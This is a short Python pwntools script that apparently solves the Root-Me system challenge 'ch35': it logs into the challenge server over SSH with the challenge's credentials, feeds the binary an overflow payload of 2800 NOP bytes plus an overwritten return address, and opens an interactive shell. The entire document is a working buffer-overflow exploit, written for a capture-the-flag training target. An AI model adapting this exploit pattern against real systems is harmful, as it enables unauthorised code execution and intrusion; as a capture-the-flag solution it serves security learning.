from pwn import *

r = ssh('app-systeme-ch35', 'challenge03.root-me.org', port=2223, password='app-systeme-ch35')
p = r.process('./ch35')
payload = '\x90' * 2800 
payload += '\xe7\x05\x00\x00\x00\x00\x00'

p.sendline(payload)

p.interactive()
